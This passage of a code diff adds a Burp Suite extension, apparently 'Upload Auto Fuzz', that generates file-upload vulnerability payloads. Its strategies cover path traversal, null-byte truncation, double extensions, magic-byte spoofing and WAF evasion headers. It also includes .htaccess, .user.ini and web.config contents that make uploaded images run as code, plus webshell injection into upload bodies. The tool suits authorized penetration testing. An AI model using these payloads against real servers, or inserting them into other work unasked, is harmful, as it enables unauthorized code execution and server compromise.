+                yield self._replace_filename(template, filename_match, pattern)
+
+
+class LinuxFeaturesStrategy(FuzzStrategy):
+    """
+    Strategy exploiting Linux/Unix filesystem features.
+    
+    Techniques include:
+    - Path traversal
+    - Symbolic link tricks
+    - Apache multi-extension handling
+    - Null byte injection
+    """
+    
+    name = "linux_features"
+    description = "Linux/Unix filesystem bypass techniques"
+    category = "linux_features"
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate Linux-specific bypass payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            # Apache multi-extension (AddHandler)
+            apache_patterns = [
+                '{}.{}.jpg'.format(base_name, ext),
+                '{}.{}.png'.format(base_name, ext),
+                '{}.{}.gif'.format(base_name, ext),
+                '{}.jpg.{}'.format(base_name, ext),
+            ]
+            
+            for pattern in apache_patterns:
+                yield self._replace_filename(template, filename_match, pattern)
+            
+            # Path traversal attempts
+            traversal_patterns = [
+                '../{}.{}'.format(base_name, ext),
+                '../../{}.{}'.format(base_name, ext),
+                '../../../{}.{}'.format(base_name, ext),
+                '..../{}.{}'.format(base_name, ext),
+                '..\\{}.{}'.format(base_name, ext),
+            ]
+            
+            for pattern in traversal_patterns:
+                yield self._replace_filename(template, filename_match, pattern)
+            
+            # Dot prefix (hidden files)
+            yield self._replace_filename(template, filename_match,
+                                        '.{}.{}'.format(base_name, ext))
+            
+            # Trailing dot
+            yield self._replace_filename(template, filename_match,
+                                        '{}.{}.'.format(base_name, ext))
+
+
+class MagicBytesStrategy(FuzzStrategy):
+    """
+    Strategy for file magic bytes/signature spoofing.
+    
+    Prepends legitimate file signatures to bypass content-based detection.
+    """
+    
+    name = "magic_bytes"
+    description = "File magic bytes spoofing"
+    category = "magic_bytes"
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate magic bytes spoofing payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        # Find content section
+        content_match = safe_regex_search(r'Content-Type:[^\r\n]*\r\n\r\n', template)
+        if not content_match:
+            return
+        
+        content_marker = content_match.group(0)
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            # Replace filename
+            modified = self._replace_filename(template, filename_match,
+                                             "{}.{}".format(base_name, ext))
+            
+            # Prepend magic bytes
+            for magic_name, magic_bytes in MAGIC_BYTES.items():
+                # Insert magic bytes after Content-Type header
+                payload = modified.replace(content_marker, 
+                                          content_marker + magic_bytes)
+                yield payload
+
+
+class NullByteStrategy(FuzzStrategy):
+    """
+    Strategy for null byte injection attacks.
+    
+    Exploits improper null byte handling in various languages/frameworks.
+    """
+    
+    name = "null_byte"
+    description = "Null byte injection techniques"
+    category = "null_byte"
+    
+    # Various null byte representations
+    NULL_VARIANTS = [
+        '%00', '\\0', '\\x00', '\x00',
+        '%2500',  # Double URL encoding
+        '%u0000',  # Unicode null
+    ]
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate null byte injection payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            for null in self.NULL_VARIANTS:
+                # Null byte before allowed extension
+                patterns = [
+                    '{}.{}{}.jpg'.format(base_name, ext, null),
+                    '{}.{}{}jpg'.format(base_name, ext, null),
+                    '{}{}.{}'.format(base_name, null, ext),
+                ]
+                
+                for pattern in patterns:
+                    yield self._replace_filename(template, filename_match, pattern)
+
+
+class EncodingStrategy(FuzzStrategy):
+    """
+    Strategy for encoding-based bypass techniques.
+    
+    Techniques include:
+    - URL encoding
+    - Double URL encoding
+    - Unicode encoding
+    - Base64 encoding
+    - MIME encoding (RFC 2047)
+    """
+    
+    name = "encoding"
+    description = "Encoding-based bypass techniques"
+    category = "encoding"
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate encoding bypass payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            full_name = "{}.{}".format(base_name, ext)
+            
+            # URL encoding variations
+            url_patterns = [
+                '{}.%70%68%70'.format(base_name) if ext == 'php' else None,  # .php
+                '{}.%61%73%70'.format(base_name) if ext == 'asp' else None,  # .asp
+                '{}.%6a%73%70'.format(base_name) if ext == 'jsp' else None,  # .jsp
+            ]
+            
+            for pattern in url_patterns:
+                if pattern:
+                    yield self._replace_filename(template, filename_match, pattern)
+            
+            # Double URL encoding
+            double_encoded = '{}.%2570%2568%2570'.format(base_name) if ext == 'php' else None
+            if double_encoded:
+                yield self._replace_filename(template, filename_match, double_encoded)
+            
+            # MIME encoding (RFC 2047)
+            try:
+                b64_name = base64.b64encode(full_name)
+                mime_patterns = [
+                    '=?utf-8?B?{}?='.format(b64_name),
+                    '=?utf-8?Q?{}?='.format(full_name.replace('.', '=2E')),
+                ]
+                
+                for pattern in mime_patterns:
+                    yield self._replace_filename(template, filename_match, pattern)
+            except Exception:
+                pass  # Skip if encoding fails
+            
+            # Unicode normalization bypass
+            unicode_patterns = [
+                u'{}.p\u0068p'.format(base_name) if ext == 'php' else None,
+                u'{}.ph\u0070'.format(base_name) if ext == 'php' else None,
+            ]
+            
+            for pattern in unicode_patterns:
+                if pattern:
+                    yield self._replace_filename(template, filename_match, pattern)
+
+
+class WAFBypassStrategy(FuzzStrategy):
+    """
+    Strategy for Web Application Firewall bypass.
+    
+    Techniques include:
+    - Header injection
+    - Chunked encoding
+    - Request smuggling patterns
+    - Oversized payloads
+    """
+    
+    name = "waf_bypass"
+    description = "WAF bypass techniques"
+    category = "waf_bypass"
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate WAF bypass payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            # Oversized filename (buffer overflow / WAF bypass)
+            long_name = 'A' * 200 + '.{}'.format(ext)
+            yield self._replace_filename(template, filename_match, long_name)
+            
+            # Filename with many dots
+            dotted_name = '{}.....{}'.format(base_name, ext)
+            yield self._replace_filename(template, filename_match, dotted_name)
+            
+            # Add junk headers before Content-Disposition
+            if 'Content-Disposition:' in template:
+                junk_header = 'X-Junk: ' + 'A' * 500 + '\r\n'
+                modified = template.replace('Content-Disposition:', 
+                                           junk_header + 'Content-Disposition:')
+                modified = self._replace_filename(modified, filename_match,
+                                                 '{}.{}'.format(base_name, ext))
+                yield modified
+            
+            # Chunked transfer encoding header
+            if 'Content-Type:' in template:
+                chunked = template.replace('Content-Type:', 
+                                          'Transfer-Encoding: chunked\r\nContent-Type:')
+                chunked = self._replace_filename(chunked, filename_match,
+                                                '{}.{}'.format(base_name, ext))
+                yield chunked
+            
+            # Multiple Content-Disposition headers
+            if 'Content-Disposition:' in template:
+                double_cd = template.replace(
+                    'Content-Disposition:',
+                    'Content-Disposition: form-data; name="decoy"; filename="safe.jpg"\r\nContent-Disposition:'
+                )
+                double_cd = self._replace_filename(double_cd, filename_match,
+                                                  '{}.{}'.format(base_name, ext))
+                yield double_cd
+
+
+class ConfigFileStrategy(FuzzStrategy):
+    """
+    Strategy for uploading configuration files that enable code execution.
+    
+    Files include:
+    - .htaccess (Apache) - SetHandler to parse all files as PHP
+    - .user.ini (PHP) - auto_prepend_file to include malicious file
+    - web.config (IIS) - handlers configuration
+    """
+    
+    name = "config_files"
+    description = "Configuration file upload techniques"
+    category = "config_files"
+    
+    # Config files that can enable code execution
+    CONFIG_FILES = [
+        '.htaccess',
+        '.user.ini',
+        'web.config',
+        '.php.ini',
+        'php.ini',
+    ]
+    
+    # Config file contents for code execution
+    CONFIG_CONTENTS = {
+        '.htaccess': [
+            'SetHandler application/x-httpd-php',
+            'AddType application/x-httpd-php .jpg',
+            'AddType application/x-httpd-php .png',
+            'AddType application/x-httpd-php .gif',
+            '<FilesMatch ".*">\nSetHandler application/x-httpd-php\n</FilesMatch>',
+        ],
+        '.user.ini': [
+            'auto_prepend_file=shell.gif',
+            'auto_prepend_file=1.gif',
+            'auto_append_file=shell.gif',
+        ],
+        'web.config': [
+            '<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n<system.webServer>\n<handlers>\n<add name="aspx" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />\n</handlers>\n</system.webServer>\n</configuration>',
+        ],
+    }
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate config file upload payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        # Find content section for replacing file content
+        content_match = safe_regex_search(
+            r'(Content-Type:[^\r\n]*\r\n\r\n)(.*?)(?:\r\n--|\Z)', 
+            template, 
+            re.DOTALL
+        )
+        
+        for config_file in self.CONFIG_FILES:
+            # Just change filename
+            yield self._replace_filename(template, filename_match, config_file)
+            
+            # Change filename and content
+            if content_match and config_file in self.CONFIG_CONTENTS:
+                content_header = content_match.group(1)
+                original_content = content_match.group(2)
+                
+                modified = self._replace_filename(template, filename_match, config_file)
+                
+                for config_content in self.CONFIG_CONTENTS[config_file]:
+                    if original_content:
+                        payload = modified.replace(original_content, config_content)
+                    else:
+                        payload = modified.replace(content_header, content_header + config_content)
+                    yield payload
+
+
+class WebShellContentStrategy(FuzzStrategy):
+    """
+    Strategy for injecting webshell content into uploads.
+    
+    Combines filename bypass with actual webshell payloads.
+    """
+    
+    name = "webshell_content"
+    description = "WebShell content injection"
+    category = "webshell_content"
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate webshell content payloads."""
+        if not self.config.include_webshell:
+            return
+        
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        # Find content section
+        content_match = safe_regex_search(
+            r'(Content-Type:[^\r\n]*\r\n\r\n)(.*?)(?:\r\n--|\Z)', 
+            template, 
+            re.DOTALL
+        )
+        
+        if not content_match:
+            return
+        
+        content_header = content_match.group(1)
+        original_content = content_match.group(2)
+        
+        for lang in self.config.target_languages:
+            if lang not in WEBSHELL_TEMPLATES:
+                continue
+            
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            # Replace filename
+            modified = self._replace_filename(template, filename_match,
+                                             "{}.{}".format(base_name, ext))
+            
+            for webshell in WEBSHELL_TEMPLATES[lang]:
+                # Replace content with webshell
+                if original_content:
+                    payload = modified.replace(original_content, webshell)
+                else:
+                    # Append webshell after content header
+                    payload = modified.replace(content_header, content_header + webshell)
+                
+                yield payload
+                
+                # With magic bytes prefix
+                for magic_name, magic_bytes in MAGIC_BYTES.items():
+                    prefixed_shell = magic_bytes + webshell
+                    if original_content:
+                        payload = modified.replace(original_content, prefixed_shell)
+                    else:
+                        payload = modified.replace(content_header, content_header + prefixed_shell)
+                    yield payload
+
+
+class SpecialCharacterStrategy(FuzzStrategy):
+    """
+    Strategy for special character injection in filenames.
+    
+    Tests various special characters that may cause parsing issues.
+    """
+    
+    name = "special_chars"
+    description = "Special character injection"
+    category = "special_chars"
+    
+    # Special characters to test
+    SPECIAL_CHARS = [
+        ' ', '\t', '\n', '\r',
+        '/', '\\', ':', '*', '?', '"', '<', '>', '|',
+        ';', '&', '$', '`', "'", '#', '@', '!', '^',
+    ]
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate special character injection payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            for char in self.SPECIAL_CHARS:
+                # Character before extension
+                pattern1 = '{}{}.{}'.format(base_name, char, ext)
+                yield self._replace_filename(template, filename_match, pattern1)
+                
+                # Character after extension
+                pattern2 = '{}.{}{}'.format(base_name, ext, char)
+                yield self._replace_filename(template, filename_match, pattern2)
+                
+                # Character in middle of extension (e.g., sh;ell.php -> p;hp)
+                if len(ext) >= 2:
+                    mid = len(ext) // 2
+                    pattern3 = '{}.{}{}{}'.format(base_name, ext[:mid], char, ext[mid:])
+                    yield self._replace_filename(template, filename_match, pattern3)
+                
+                # Character between filename and dot
+                pattern4 = '{}{}.{}'.format(base_name, char, ext)
+                yield self._replace_filename(template, filename_match, pattern4)
+            
+            # 空格在点后面 (shell. php)
+            yield self._replace_filename(template, filename_match, '{}. {}'.format(base_name, ext))
+            
+            # 多个点
+            yield self._replace_filename(template, filename_match, '{}...{}'.format(base_name, ext))
+            yield self._replace_filename(template, filename_match, '{}.....{}'.format(base_name, ext))
+
+
+class CaseVariationStrategy(FuzzStrategy):
+    """
+    Strategy for extension case variation bypass.
+    
+    Tests various case combinations of file extensions.
+    """
+    
+    name = "case_variation"
+    description = "Extension case variation bypass"
+    category = "case_variation"
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate case variation payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            # Generate case variations
+            variations = self._generate_case_variations(ext)
+            
+            for var in variations:
+                yield self._replace_filename(template, filename_match,
+                                            '{}.{}'.format(base_name, var))
+    
+    def _generate_case_variations(self, ext):
+        """Generate all meaningful case variations of an extension."""
+        if len(ext) > 5:
+            # For long extensions, just do basic variations
+            return [ext.upper(), ext.lower(), ext.capitalize()]
+        
+        variations = set()
+        
+        # Basic variations
+        variations.add(ext.upper())
+        variations.add(ext.lower())
+        variations.add(ext.capitalize())
+        
+        # Mixed case (first and last different)
+        if len(ext) >= 2:
+            variations.add(ext[0].upper() + ext[1:].lower())
+            variations.add(ext[0].lower() + ext[1:].upper())
+            variations.add(ext[:-1].lower() + ext[-1].upper())
+        
+        # Alternating case
+        if len(ext) >= 3:
+            alt1 = ''.join(c.upper() if i % 2 == 0 else c.lower() 
+                         for i, c in enumerate(ext))
+            alt2 = ''.join(c.lower() if i % 2 == 0 else c.upper() 
+                         for i, c in enumerate(ext))
+            variations.add(alt1)
+            variations.add(alt2)
+        
+        return list(variations)
+
+
+class DoubleExtensionStrategy(FuzzStrategy):
+    """
+    Strategy for double/multiple extension bypass.
+    
+    Exploits servers that only check the last or first extension.
+    """
+    
+    name = "double_extension"
+    description = "Double/multiple extension bypass"
+    category = "double_extension"
+    
+    # Allowed extensions to combine with
+    ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'txt', 'pdf', 'doc']
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate double extension payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            for allowed in self.ALLOWED_EXTENSIONS:
+                # Executable first, allowed second
+                yield self._replace_filename(template, filename_match,
+                                            '{}.{}.{}'.format(base_name, ext, allowed))
+                
+                # Allowed first, executable second
+                yield self._replace_filename(template, filename_match,
+                                            '{}.{}.{}'.format(base_name, allowed, ext))
+                
+                # Triple extension
+                yield self._replace_filename(template, filename_match,
+                                            '{}.{}.{}.{}'.format(base_name, allowed, ext, allowed))
+
+
+# =============================================================================
+# Payload Factory
+# =============================================================================
+
+class PayloadFactory(object):
+    """
+    Factory class for managing and executing fuzzing strategies.
+    
+    Responsibilities:
+    - Strategy registration and management
+    - Coordinated payload generation
+    - Deduplication and limiting
+    """
+    
+    def __init__(self, config=None):
+        """
+        Initialize the factory with configuration.
+        
+        Args:
+            config: FuzzConfig instance or None for default
+        """
+        self.config = config or FuzzConfig()
+        self._strategies = {}
+        self._register_default_strategies()
+    
+    def _register_default_strategies(self):
+        """Register all built-in strategies."""
+        default_strategies = [
+            SuffixBypassStrategy,
+            ContentDispositionStrategy,
+            ContentTypeStrategy,
+            WindowsFeaturesStrategy,
+            LinuxFeaturesStrategy,
+            MagicBytesStrategy,
+            NullByteStrategy,
+            EncodingStrategy,
+            WAFBypassStrategy,
+            ConfigFileStrategy,
+            WebShellContentStrategy,
+            SpecialCharacterStrategy,
+            CaseVariationStrategy,
+            DoubleExtensionStrategy,
+        ]
+        
+        for strategy_class in default_strategies:
+            self.register_strategy(strategy_class)
+    
+    def register_strategy(self, strategy_class):
+        """
+        Register a new strategy.
+        
+        Args:
+            strategy_class: Class inheriting from FuzzStrategy
+        """
+        strategy = strategy_class(self.config)
+        self._strategies[strategy.name] = strategy
+        Logger.debug("Registered strategy: {}".format(strategy.name))
+    
+    def unregister_strategy(self, name):
+        """
+        Unregister a strategy by name.
+        
+        Args:
+            name: Strategy name to remove
+        """
+        if name in self._strategies:
+            del self._strategies[name]
+    
+    def get_strategy(self, name):
+        """
+        Get a strategy by name.
+        
+        Args:
+            name: Strategy name
+        
+        Returns:
+            FuzzStrategy instance or None
+        """
+        return self._strategies.get(name)
+    
+    def list_strategies(self):
+        """
+        List all registered strategies.
+        
+        Returns:
+            List of (name, description) tuples
+        """
+        return [(s.name, s.description) for s in self._strategies.values()]
+    
+    def generate_payloads(self, template):
+        """
+        Generate all payloads for a given template.
+        
+        This is the main entry point for payload generation. It:
+        1. Parses the template to extract filename and content-type
+        2. Runs all enabled strategies
+        3. Deduplicates results
+        4. Limits to max_payloads
+        
+        Args:
+            template: HTTP request template string
+        
+        Returns:
+            List of unique payload strings
+        """
+        # Parse template
+        filename, extension, _ = extract_filename_parts(template)
+        content_type = extract_content_type(template)
+        
+        if not filename:
+            Logger.error("Could not extract filename from template")
+            return [template]  # Return original as fallback
+        
+        Logger.info("Generating payloads for: {} (ext: {})".format(filename, extension))
+        
+        # Collect payloads from all enabled strategies
+        seen_hashes = set()
+        payloads = []
+        
+        for name, strategy in self._strategies.items():
+            if not self.config.is_strategy_enabled(strategy.category):
+                Logger.debug("Skipping disabled strategy: {}".format(name))
+                continue
+            
+            try:
+                for payload in strategy.generate(template, filename, extension, content_type):
+                    if payload is None:
+                        continue
+                    
+                    # Deduplicate using hash
+                    payload_hash = compute_payload_hash(payload)
+                    if payload_hash in seen_hashes:
+                        continue
+                    
+                    seen_hashes.add(payload_hash)
+                    payloads.append(payload)
+                    
+                    # Check limit
+                    if len(payloads) >= self.config.max_payloads:
+                        Logger.warn("Reached max payload limit: {}".format(self.config.max_payloads))
+                        return payloads
+                        
+            except Exception as e:
+                Logger.error("Strategy {} failed: {}".format(name, str(e)))
+                continue
+        
+        Logger.info("Generated {} unique payloads".format(len(payloads)))
+        return payloads
+
+
+# =============================================================================
+# Burp Suite Integration
+# =============================================================================
+
+class ConfigPanel(JPanel):
+    """
+    Professional configuration panel for Upload Auto Fuzz.
+    
+    Provides comprehensive UI controls for:
+    - Target language selection with visual feedback
+    - Strategy category enable/disable
+    - Real-time configuration status
+    - Automatic dark/light theme support
+    """
+    
+    def __init__(self, config):
+        """
+        Initialize the configuration panel.
+        
+        Args:
+            config: FuzzConfig instance
+        """
+        JPanel.__init__(self)
+        self.config = config
+        self._init_ui()
+    
+    def _get_colors(self):
+        """
+        Get colors based on current Burp theme (dark or light).
+        
+        Returns:
+            Dictionary with color values for different UI elements
+        """
+        # Try to detect dark theme by checking background color
+        bg = UIManager.getColor("Panel.background")
+        
+        if bg is not None:
+            # Calculate luminance to detect dark theme
+            luminance = (0.299 * bg.getRed() + 0.587 * bg.getGreen() + 0.114 * bg.getBlue()) / 255
+            is_dark = luminance < 0.5
+        else:
+            is_dark = False
+        
+        if is_dark:
+            # Dark theme colors
+            return {
+                'bg': UIManager.getColor("Panel.background") or Color(43, 43, 43),
+                'fg': UIManager.getColor("Panel.foreground") or Color(187, 187, 187),
+                'text_bg': Color(60, 63, 65),
+                'text_fg': Color(187, 187, 187),
+                'border': Color(85, 85, 85),
+                'title_fg': Color(200, 200, 200),
+            }
+        else:
+            # Light theme colors
+            return {
+                'bg': UIManager.getColor("Panel.background") or Color(255, 255, 255),
+                'fg': UIManager.getColor("Panel.foreground") or Color(0, 0, 0),
+                'text_bg': Color(245, 245, 245),
+                'text_fg': Color(0, 0, 0),
+                'border': Color(200, 200, 200),
+                'title_fg': Color(0, 0, 0),
+            }
+    
+    def _init_ui(self):
+        """Initialize UI components with professional layout."""
+        colors = self._get_colors()
+        
+        self.setLayout(BorderLayout(10, 10))
+        self.setBorder(BorderFactory.createEmptyBorder(15, 15, 15, 15))
+        
+        # ===== Header Panel =====
+        header_panel = JPanel(BorderLayout())
+        header_panel.setBorder(BorderFactory.createEmptyBorder(0, 0, 15, 0))
+        header_panel.setOpaque(False)
+        
+        title_label = JLabel("Upload Auto Fuzz v{}".format(VERSION))
+        title_label.setFont(Font("SansSerif", Font.BOLD, 18))
+        header_panel.add(title_label, BorderLayout.WEST)
+        
+        subtitle_label = JLabel("File Upload Vulnerability Testing Tool")
+        subtitle_label.setFont(Font("SansSerif", Font.PLAIN, 12))
+        header_panel.add(subtitle_label, BorderLayout.SOUTH)
+        
+        self.add(header_panel, BorderLayout.NORTH)
+        
+        # ===== Main Content Panel (Split) =====
+        main_panel = JPanel(GridBagLayout())
+        main_panel.setOpaque(False)
+        gbc = GridBagConstraints()
+        gbc.fill = GridBagConstraints.BOTH
+        gbc.insets = Insets(5, 5, 5, 5)
+        
+        # ----- Left Column: Language Selection -----
+        lang_panel = self._create_language_panel(colors)
+        gbc.gridx = 0
+        gbc.gridy = 0
+        gbc.weightx = 0.4
+        gbc.weighty = 0.6
+        main_panel.add(lang_panel, gbc)
+        
+        # ----- Right Column: Strategy Selection -----
+        strategy_panel = self._create_strategy_panel(colors)
+        gbc.gridx = 1
+        gbc.gridy = 0
+        gbc.weightx = 0.6
+        gbc.weighty = 0.6
+        main_panel.add(strategy_panel, gbc)
+        
+        # ----- Bottom Row: Settings -----
+        settings_panel = self._create_settings_panel(colors)
+        gbc.gridx = 0
+        gbc.gridy = 1
+        gbc.gridwidth = 2
+        gbc.weightx = 1.0
+        gbc.weighty = 0.1
+        main_panel.add(settings_panel, gbc)
+        
+        # ----- Status Panel -----
+        status_panel = self._create_status_panel(colors)
+        gbc.gridx = 0
+        gbc.gridy = 2
+        gbc.gridwidth = 2
+        gbc.weightx = 1.0
+        gbc.weighty = 0.3
+        main_panel.add(status_panel, gbc)
+        
+        self.add(main_panel, BorderLayout.CENTER)
+        
+        # ===== Footer Panel =====
+        footer_panel = JPanel(FlowLayout(FlowLayout.LEFT))
+        footer_panel.setOpaque(False)
+        footer_label = JLabel("Author: T3nk0 | GitHub: github.com/T3nk0/Upload_Auto_Fuzz")
+        footer_label.setFont(Font("SansSerif", Font.ITALIC, 10))
+        footer_panel.add(footer_label)
+        self.add(footer_panel, BorderLayout.SOUTH)
+        
+        # Update status display
+        self._update_status()
+    
+    def _create_language_panel(self, colors):
+        """Create the language selection panel."""
+        panel = JPanel()
+        panel.setLayout(BoxLayout(panel, BoxLayout.Y_AXIS))
+        panel.setBorder(BorderFactory.createTitledBorder(
+            BorderFactory.createLineBorder(colors['border']),
+            "Target Backend Languages",
+            TitledBorder.LEFT,
+            TitledBorder.TOP,
+            Font("SansSerif", Font.BOLD, 12),
+            colors['title_fg']
+        ))
+        
+        # Description
+        desc_panel = JPanel(FlowLayout(FlowLayout.LEFT))
+        desc_panel.setOpaque(False)
+        desc_label = JLabel("Select languages to generate payloads for:")
+        desc_label.setFont(Font("SansSerif", Font.PLAIN, 11))
+        desc_panel.add(desc_label)
+        panel.add(desc_panel)
+        
+        # Language checkboxes with extension info
+        self._lang_checkboxes = {}
+        lang_info = {
+            'php': 'PHP (.php, .phtml, .phar, etc.)',
+            'asp': 'ASP (.asp, .asa, .cer, etc.)',
+            'aspx': 'ASP.NET (.aspx, .ashx, .asmx)',
+            'jsp': 'JSP (.jsp, .jspx, .jspa, etc.)'
+        }
+        
+        for lang, description in lang_info.items():
+            cb_panel = JPanel(FlowLayout(FlowLayout.LEFT))
+            cb_panel.setOpaque(False)
+            cb = JCheckBox(description, lang in self.config.target_languages)
+            cb.setFont(Font("SansSerif", Font.PLAIN, 12))
+            cb.setOpaque(False)
+            cb.addActionListener(lambda e, l=lang: self._on_language_toggle(l))
+            self._lang_checkboxes[lang] = cb
+            cb_panel.add(cb)
+            panel.add(cb_panel)
+        
+        # Select All / Deselect All buttons
+        btn_panel = JPanel(FlowLayout(FlowLayout.LEFT))
+        btn_panel.setOpaque(False)
+        select_all_btn = JButton("Select All")
+        select_all_btn.addActionListener(lambda e: self._select_all_languages(True))
+        deselect_all_btn = JButton("Deselect All")
+        deselect_all_btn.addActionListener(lambda e: self._select_all_languages(False))
+        btn_panel.add(select_all_btn)
+        btn_panel.add(deselect_all_btn)
+        panel.add(btn_panel)
+        
+        return panel
+    
+    def _create_strategy_panel(self, colors):
+        """Create the strategy selection panel."""
+        panel = JPanel(BorderLayout())
+        panel.setBorder(BorderFactory.createTitledBorder(
+            BorderFactory.createLineBorder(colors['border']),
+            "Fuzzing Strategies",
+            TitledBorder.LEFT,
+            TitledBorder.TOP,
+            Font("SansSerif", Font.BOLD, 12),
+            colors['title_fg']
+        ))
+        
+        # Strategy checkboxes in scrollable panel
+        inner_panel = JPanel()
+        inner_panel.setLayout(BoxLayout(inner_panel, BoxLayout.Y_AXIS))
+        
+        # Strategy descriptions (Chinese with technical terms preserved)
+        strategy_info = {
+            'suffix': u'后缀绕过 - 可执行文件扩展名变体',
+            'content_disposition': u'请求头操控 - Content-Disposition 绕过技术',
+            'content_type': u'MIME类型伪造 - Content-Type 绕过',
+            'windows_features': u'Windows特性 - NTFS ADS、保留设备名',
+            'linux_features': u'Linux特性 - 路径穿越、Apache多扩展名',
+            'magic_bytes': u'魔术字节 - 文件头签名伪造',
+            'null_byte': u'空字节注入 - 截断攻击',
+            'double_extension': u'双扩展名 - 多重扩展名绕过',
+            'case_variation': u'大小写变换 - 扩展名大小写混淆',
+            'special_chars': u'特殊字符 - 文件名注入',
+            'encoding': u'编码绕过 - URL/Unicode编码',
+            'waf_bypass': u'WAF绕过 - 防火墙规避技术',
+            'webshell_content': u'WebShell内容 - 恶意载荷注入',
+            'config_files': u'配置文件 - .htaccess、web.config上传',
+        }
+        
+        self._strategy_checkboxes = {}
+        for strategy_name, description in strategy_info.items():
+            cb_panel = JPanel(FlowLayout(FlowLayout.LEFT))
+            cb_panel.setOpaque(False)
+            enabled = self.config.enabled_strategies.get(strategy_name, True)
+            cb = JCheckBox(description, enabled)
+            cb.setFont(Font("SansSerif", Font.PLAIN, 11))
+            cb.setOpaque(False)
+            cb.addActionListener(lambda e, s=strategy_name: self._on_strategy_toggle(s))
+            self._strategy_checkboxes[strategy_name] = cb
+            cb_panel.add(cb)
+            inner_panel.add(cb_panel)
+        
+        scroll = JScrollPane(inner_panel)
+        scroll.setPreferredSize(Dimension(400, 250))
+        scroll.getViewport().setOpaque(False)
+        panel.add(scroll, BorderLayout.CENTER)
+        
+        # Select All / Deselect All buttons
+        btn_panel = JPanel(FlowLayout(FlowLayout.LEFT))
+        btn_panel.setOpaque(False)
+        select_all_btn = JButton("Enable All")
+        select_all_btn.addActionListener(lambda e: self._select_all_strategies(True))
+        deselect_all_btn = JButton("Disable All")
+        deselect_all_btn.addActionListener(lambda e: self._select_all_strategies(False))
+        btn_panel.add(select_all_btn)
+        btn_panel.add(deselect_all_btn)
+        panel.add(btn_panel, BorderLayout.SOUTH)
+        
+        return panel
+    
+    def _create_settings_panel(self, colors):
+        """Create the settings panel."""
+        panel = JPanel(FlowLayout(FlowLayout.LEFT, 20, 10))
+        panel.setBorder(BorderFactory.createTitledBorder(
+            BorderFactory.createLineBorder(colors['border']),
+            "Generation Settings",
+            TitledBorder.LEFT,
+            TitledBorder.TOP,
+            Font("SansSerif", Font.BOLD, 12),
+            colors['title_fg']
+        ))
+        
+        # WebShell content toggle
+        self._webshell_cb = JCheckBox("Include WebShell Content", self.config.include_webshell)
+        self._webshell_cb.setFont(Font("SansSerif", Font.PLAIN, 12))
+        self._webshell_cb.setOpaque(False)
+        self._webshell_cb.addActionListener(lambda e: self._on_webshell_toggle())
+        panel.add(self._webshell_cb)
+        
+        return panel
+    
+    def _create_status_panel(self, colors):
+        """Create the status display panel."""
+        panel = JPanel(BorderLayout())
+        panel.setBorder(BorderFactory.createTitledBorder(
+            BorderFactory.createLineBorder(colors['border']),
+            "Current Configuration Status",
+            TitledBorder.LEFT,
+            TitledBorder.TOP,
+            Font("SansSerif", Font.BOLD, 12),
+            colors['title_fg']
+        ))
+        
+        self._status_area = JTextArea(4, 50)
+        self._status_area.setEditable(False)
+        self._status_area.setFont(Font("Monospaced", Font.PLAIN, 11))
+        self._status_area.setBackground(colors['text_bg'])
+        self._status_area.setForeground(colors['text_fg'])
+        
+        scroll = JScrollPane(self._status_area)
+        panel.add(scroll, BorderLayout.CENTER)
+        
+        return panel
+    
+    def _on_language_toggle(self, lang):
+        """Handle language checkbox toggle."""
+        cb = self._lang_checkboxes[lang]
+        if cb.isSelected():
+            if lang not in self.config.target_languages:
+                self.config.target_languages.append(lang)
+        else:
+            if lang in self.config.target_languages:
+                self.config.target_languages.remove(lang)
+        self._update_status()
+    
+    def _on_strategy_toggle(self, strategy):
+        """Handle strategy checkbox toggle."""
